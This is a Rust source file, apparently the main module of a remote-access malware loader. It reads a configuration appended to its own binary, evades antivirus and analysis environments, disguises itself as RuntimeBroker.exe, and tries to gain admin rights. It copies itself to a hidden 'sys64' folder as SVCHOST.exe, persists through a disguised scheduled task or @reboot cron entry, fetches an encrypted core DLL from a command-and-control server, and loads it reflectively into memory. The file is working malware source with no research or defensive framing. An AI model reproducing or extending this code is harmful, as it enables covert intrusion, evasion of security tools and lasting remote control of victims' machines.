#![cfg_attr(feature = "desktop", windows_subsystem = "windows")]

mod config;
mod dll_fetch;
mod elevation;
mod pe_loader;

use config::LoaderConfig;
use std::env;

macro_rules! log {
    ($($arg:tt)*) => {
        // Debug builds only — a shipped loader must stay silent on stderr.
        if cfg!(debug_assertions) {
            eprintln!($($arg)*);
            let _ = std::io::Write::flush(&mut std::io::stderr());
        }
    };
}

fn main() {
    log!("[1/10] main() entered");

    let args: Vec<String> = env::args().collect();
    let is_boot = args.iter().any(|a| a == "--boot");
    // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
    // persistence。仅 debug_assertions 构建可用 —— 发布载荷禁止绕过正常下发
    // 流程（任何拿到二进制的人都可 --local 加载任意 DLL，等于把 loader 变成
    // 任意代码执行器；同时 dev 配置写死 127.0.0.1:5000 也毫无用处）。
    #[cfg(debug_assertions)]
    let local_path = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)).cloned();
    #[cfg(not(debug_assertions))]
    let local_path: Option<String> = None;
    log!("[2/10] args parsed, is_boot={}, local={}", is_boot, local_path.is_some());

    // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
    // persistence。仅 debug_assertions 构建可用（见上方 local_path 解析）。
    if let Some(ref path) = local_path {
        log!("[DEV] --local mode: loading {} directly", path);
        let dll_bytes = match std::fs::read(path) {
            Ok(b) => {
                log!("[DEV] read {} bytes", b.len());
                b
            }
            Err(e) => fatal_exit(&format!("[DEV] FAIL: read {}: {}", path, e)),
        };

        if dll_bytes.len() < 64 {
            fatal_exit("[DEV] FAIL: DLL too small");
        }

        log!("[DEV] reflective_load...");
        let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
            Ok(f) => {
                log!("[DEV] reflective_load OK");
                f
            }
            Err(e) => fatal_exit(&format!("[DEV] FAIL: reflective_load: {}", e)),
        };

        // Pass a minimal config JSON for dev
        let dev_config = r#"{"server_url":"http://127.0.0.1:5000","register_path":"/api/beacon/register","heartbeat_path":"/api/beacon/heartbeat","result_path":"/api/beacon/result","ws_path":"/ws/agent","heartbeat_interval_ms":3000,"jitter_percent":0.2,"require_admin":false,"enable_persistence":false,"encrypted_aes_key":"","core_download_path":"","rsa_private_key":"","anti_analysis":{"enabled":false}}"#;
        log!("[DEV] calling core_main ({} bytes config)...", dev_config.len());
        entry_fn(dev_config.as_ptr(), dev_config.len());
        log!("[DEV] core_main returned!");
        std::process::exit(0);
    }

    // 1. Parse injected config from binary
    log!("[3/10] parsing injected config...");
    let (injected, raw_json) = match parse_injected_config() {
        Some((cfg, json)) => {
            log!("[3/10] config OK ({} bytes)", json.len());
            (cfg, json)
        }
        None => {
            fatal_exit("[3/10] FAIL: no LIBRA_CFG_BLOCK! magic found");
        }
    };

    let loader_cfg = LoaderConfig::from_injected(injected, raw_json);
    log!("[3/10] LoaderConfig created, server={}", loader_cfg.server_url);

    // 2. Anti-analysis (skip on --boot relaunch)
    if !is_boot {
        log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
        if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_av_processes {
            log!("[4/10] checking av processes...");
            if check_av_processes() {
                log!("[4/10] av process detected — exiting immediately");
                std::process::exit(0);
            }
            log!("[4/10] av process check passed");
        }
        if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_test_signing {
            log!("[4/10] checking test signing...");
            if check_test_signing() {
                log!("[4/10] test signing detected — sleeping forever");
                std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
                std::process::exit(0);
            }
            log!("[4/10] test signing check passed");
        }
        if !loader_cfg.anti_analysis.enabled {
            log!("[4/10] anti-analysis disabled, skipping");
        }
    } else {
        log!("[4/10] --boot: skipping anti-analysis");
    }

    // 3. PEB spoofing
    log!("[5/10] spoof_peb...");
    elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
    log!("[5/10] spoof_peb done");

    // 4. Elevation (skip on --boot relaunch)
    if !is_boot && loader_cfg.require_admin {
        log!("[6/10] require_admin=true, trying elevation...");
        if elevation::is_admin() {
            log!("[6/10] already admin, continuing");
        } else {
            let exe = env::current_exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();
            if !exe.is_empty() {
                match elevation::try_elevate(&exe) {
                    Ok(true) => {
                        // Wait briefly to confirm elevated process is alive
                        log!("[6/10] elevated process spawned, waiting to confirm...");
                        std::thread::sleep(std::time::Duration::from_millis(2000));
                        if elevation::check_elevated_instance_running(&exe) {
                            log!("[6/10] confirmed elevated instance running, exiting");
                            std::process::exit(0);
                        } else {
                            log!("[6/10] elevated instance NOT detected, continuing in current process");
                        }
                    }
                    Ok(false) => {
                        log!("[6/10] already admin, continuing");
                    }
                    Err(_) => {
                        log!("[6/10] elevation failed, continuing without admin");
                    }
                }
            }
        }
    } else if !is_boot {
        log!("[6/10] require_admin=false, skipping");
    } else {
        log!("[6/10] --boot: skipping elevation");
    }

    // 5. Persistence (skip on --boot relaunch)
    if !is_boot {
        // Step 1: Copy current exe to AppData (don't exit yet)
        let target_exe = if let Some(path) = loader_cfg.copy_to_path.as_deref() {
            if !path.is_empty() {
                log!("[7/10] copy_to_path={}, copying...", path);
                copy_exe_to_target()
            } else { None }
        } else { None };

        // Step 2: Install scheduled task / cron — point to the copy if available
        if loader_cfg.enable_persistence {
            log!("[7/10] installing persistence...");
            install_persistence_at(target_exe.as_deref());
        }

        // Step 3: Relaunch from the copy and exit
        if let Some(ref target) = target_exe {
            log!("[7/10] relaunching from {:?}...", target);
            relaunch_from(target);
        }
    } else {
        log!("[7/10] --boot: skipping persistence");
    }
    log!("[7/10] persistence done");

    // 6. Negotiate core AES key at runtime (no embedded private key), then
    //    download + decrypt the core DLL.
    log!("[8/10] negotiating core AES key...");
    let download_url = loader_cfg.download_url();
    let key_server_url = loader_cfg.server_url.clone();
    let key_path = loader_cfg.core_key_path.clone();
    let build_id = loader_cfg.build_id();
    let beacon_secret = loader_cfg.beacon_secret.clone();
    let server_public_key = loader_cfg.server_public_key.clone();
    log!("[9/10] downloading core from {}...", download_url);

    let download_result = std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| format!("tokio runtime: {}", e))?;

        let (mut aes_key, download_token) = rt.block_on(dll_fetch::handshake_core_key(
            &key_server_url, &key_path, &build_id, &beacon_secret, &server_public_key))
            .map_err(|e| format!("handshake: {}", e))?;

        // core.bin 下载带一次性凭证（防枚举）；旧服务端无凭证时原样下载
        let dl_url = if download_token.is_empty() {
            download_url
        } else {
            format!("{}?t={}", download_url, download_token)
        };
        let encrypted = rt.block_on(dll_fetch::download_core(&dl_url))
            .map_err(|e| format!("download: {}", e))?;

        let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key)
            .map_err(|e| format!("decrypt: {}", e))?;

        use zeroize::Zeroize;
        aes_key.zeroize();

        Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
    }).join().unwrap_or(Err("download thread panic".into()));

    let dll_bytes = match download_result {
        Ok((decrypted, enc_len)) => {
            log!("[9/10] download OK ({} bytes), decrypt OK ({} bytes)", enc_len, decrypted.len());
            decrypted
        }
        Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
    };

    // 9. Validate PE header (basic sanity check)
    if dll_bytes.len() < 64 {
        fatal_exit("[9/10] FAIL: payload too small");
    }
    #[cfg(target_os = "windows")]
    if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        fatal_exit("[9/10] FAIL: not a valid PE (MZ missing)");
    }
    log!("[9/10] PE validated ({} bytes)", dll_bytes.len());

    // 10. Reflective load
    log!("[10/10] reflective_load...");
    let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
        Ok(f) => {
            log!("[10/10] reflective_load OK");
            f
        }
        Err(e) => {
            fatal_exit(&format!("[10/10] FAIL: reflective_load: {}", e));
        }
    };

    // 11. Call core_main — should never return
    let config_bytes = loader_cfg.config_json.as_bytes();
    log!("[10/10] calling core_main ({} bytes config)...", config_bytes.len());
    entry_fn(config_bytes.as_ptr(), config_bytes.len());

    // Should not reach here
    log!("[10/10] core_main returned! exiting...");
    std::process::exit(0);
}

// ── Fatal exit with visible output ────────────────────────────────────

fn fatal_exit(msg: &str) -> ! {
    log!("{}", msg);
    std::thread::sleep(std::time::Duration::from_millis(100));
    std::process::exit(1);
}

// ── Config Injection ──────────────────────────────────────────────────

use libra_common::models::{InjectedConfig, CONFIG_MAGIC};

fn parse_injected_config() -> Option<(InjectedConfig, String)> {
    let exe_path = env::current_exe().ok()?;
    log!("  exe: {}", exe_path.display());
    let data = std::fs::read(&exe_path).ok()?;
    log!("  read {} bytes", data.len());

    if data.len() < CONFIG_MAGIC.len() + 4 {
        log!("  too small for config block");
        return None;
    }

    let magic_pos = data
        .windows(CONFIG_MAGIC.len())
        .rposition(|w| w == CONFIG_MAGIC.as_slice())?;
    log!("  magic at offset 0x{:X}", magic_pos);

    let pos = magic_pos + CONFIG_MAGIC.len();
    if pos + 4 > data.len() {
        log!("  no length after magic");
        return None;
    }

    let len_bytes: [u8; 4] = data[pos..pos + 4].try_into().ok()?;
    let json_len = u32::from_le_bytes(len_bytes) as usize;
    let json_start = pos + 4;
    log!("  json_len={}", json_len);

    // Config must be at EOF (appended last after obfuscation/junk)
    if json_start + json_len != data.len() {
        log!("  config not at EOF (was {} vs total {})", json_start + json_len, data.len());
        return None;
    }

    let json_bytes = &data[json_start..json_start + json_len];
    let json_str = std::str::from_utf8(json_bytes).ok()?;
    log!("  json: {}", &json_str[..json_str.len().min(200)]);

    let config: InjectedConfig = serde_json::from_str(json_str).ok()?;
    log!("  deserialization OK");
    Some((config, json_str.to_string()))
}

// ── Persistence (lightweight, no libra-modules dependency) ────────────

/// Copy current exe to the target location.
/// Returns the target exe path, or None if already at target or copy failed.
fn copy_exe_to_target() -> Option<std::path::PathBuf> {
    let current_exe = env::current_exe().ok()?;
    let current_dir = current_exe.parent()?;

    #[cfg(target_os = "windows")]
    let target_dir = {
        let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
        std::path::PathBuf::from(appdata).join("sys64")
    };
    #[cfg(not(target_os = "windows"))]
    let target_dir = {
        let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
        std::path::PathBuf::from(home).join(".local/share").join("sys64")
    };

    // Already at target — --boot process, no need to copy again
    if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
        log!("copy_exe: already at target, skipping");
        return None;
    }

    #[cfg(target_os = "windows")]
    let target_exe = target_dir.join("SVCHOST.exe");
    #[cfg(not(target_os = "windows"))]
    let target_exe = target_dir.join("svchost");

    if std::fs::create_dir_all(&target_dir).is_err() {
        log!("copy_exe: create_dir_all failed for {:?}", target_dir);
        return None;
    }
    if std::fs::copy(&current_exe, &target_exe).is_err() {
        log!("copy_exe: copy failed from {:?} to {:?}", current_exe, target_exe);
        return None;
    }
    log!("copy_exe: copied to {:?}", target_exe);
    Some(target_exe)
}

/// Spawn the target exe with --boot and exit the current process.
fn relaunch_from(target_exe: &std::path::Path) -> ! {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let _ = std::process::Command::new(target_exe)
            .arg("--boot")
            .creation_flags(0x08000000)
            .spawn();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = std::process::Command::new(target_exe)
            .arg("--boot")
            .spawn();
    }
    std::process::exit(0);
}

/// Install scheduled task / cron for logon persistence.
/// If target_override is provided, the task points to that path (the APPDATA copy).
fn install_persistence_at(target_override: Option<&std::path::Path>) {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let exe = match target_override {
            Some(p) => p.to_string_lossy().to_string(),
            None => match env::current_exe() {
                Ok(e) => e.to_string_lossy().to_string(),
                Err(_) => return,
            },
        };
        let _ = std::process::Command::new("schtasks.exe")
            .args(["/create", "/tn", "SecurityHealthMonitor", "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let exe = match target_override {
            Some(p) => p.to_string_lossy().to_string(),
            None => match env::current_exe() {
                Ok(e) => e.to_string_lossy().to_string(),
                Err(_) => return,
            },
        };
        let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
        let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
        let _ = std::process::Command::new("bash")
            .args(["-c", &cmd])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
}

// ── Anti-analysis: Test Signing check only ─────────────────────────────

/// Check if Windows Test Signing mode is enabled (common in analysis environments).
/// Reads HKLM\SYSTEM\CurrentControlSet\Control\SystemStartOptions for TESTSIGNING.
fn check_test_signing() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::iter;

        extern "system" {
            fn RegOpenKeyExW(
                hkey: isize, subkey: *const u16, options: u32, sam: u32, result: *mut isize,
            ) -> i32;
            fn RegQueryValueExW(
                hkey: isize, name: *const u16, reserved: *const u8, kind: *mut u32,
                data: *mut u8, len: *mut u32,
            ) -> i32;
            fn RegCloseKey(hkey: isize) -> i32;
        }

        const HKEY_LOCAL_MACHINE: isize = 0x80000002;
        const KEY_READ: u32 = 0x20019;
        const REG_SZ: u32 = 1;
        const ERROR_SUCCESS: i32 = 0;

        let subkey: Vec<u16> = "SYSTEM\\CurrentControlSet\\Control"
            .encode_utf16()
            .chain(iter::once(0))
            .collect();

        let value_name: Vec<u16> = "SystemStartOptions"
            .encode_utf16()
            .chain(iter::once(0))
            .collect();

        unsafe {
            let mut hkey: isize = 0;
            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
                return false;
            }

            let mut kind: u32 = 0;
            let mut data_len: u32 = 0;

            if RegQueryValueExW(hkey, value_name.as_ptr(), std::ptr::null(), &mut kind, std::ptr::null_mut(), &mut data_len) != ERROR_SUCCESS {
                RegCloseKey(hkey);
                return false;
            }

            if kind != REG_SZ || data_len == 0 {
                RegCloseKey(hkey);
                return false;
            }

            let mut buf: Vec<u16> = vec![0u16; (data_len / 2) as usize];
            let mut actual_len = data_len;
            if RegQueryValueExW(
                hkey, value_name.as_ptr(), std::ptr::null(), &mut kind,
                buf.as_mut_ptr() as *mut u8, &mut actual_len,
            ) != ERROR_SUCCESS {
                RegCloseKey(hkey);
                return false;
            }
            RegCloseKey(hkey);

            let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
            let s = String::from_utf16_lossy(&buf[..end]);
            s.to_lowercase().contains("testsigning")
        }
    }
    #[cfg(not(target_os = "windows"))]
    { false }
}

// ── Anti-analysis: AV process detection ──────────────────────────────

/// Known AV process names (lowercase for comparison).
const AV_PROCESSES: &[&str] = &[
    "_avp32.exe",
    "_avpcc.exe",
    "_avpm.exe",
    "rescue32.exe",
];

/// Check if any known AV process is running.
/// Uses CreateToolhelp32Snapshot / Process32FirstW / Process32NextW.
fn check_av_processes() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::ffi::c_void;

        extern "system" {
            fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> *mut c_void;
            fn Process32FirstW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
            fn Process32NextW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
            // 签名与 pe_loader.rs/elevation.rs 对齐（*mut u8），避免 clashing extern 声明
            fn CloseHandle(handle: *mut u8) -> i32;
        }

        const TH32CS_SNAPPROCESS: u32 = 0x00000002;
        const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;

        #[repr(C)]
        struct ProcessEntry32W {
            dw_size: u32,
            cnt_usage: u32,
            th32_process_id: u32,
            th32_default_heap_id: usize,
            th32_module_id: u32,
            cnt_threads: u32,
            th32_parent_process_id: u32,
            pc_pri_class_base: i32,
            dw_flags: u32,
            sz_exe_file: [u16; 260],
        }

        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                return false;
            }

            let mut entry: ProcessEntry32W = std::mem::zeroed();
            entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;

            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    // Find null terminator in sz_exe_file
                    let end = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
                    let exe_name = String::from_utf16_lossy(&entry.sz_exe_file[..end]);

                    for av in AV_PROCESSES {
                        if exe_name.eq_ignore_ascii_case(av) {
                            log!("[AV] detected process: {} (pid={})", exe_name, entry.th32_process_id);
                            CloseHandle(snapshot as *mut u8);
                            return true;
                        }
                    }

                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }

            CloseHandle(snapshot as *mut u8);
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    { false }
}
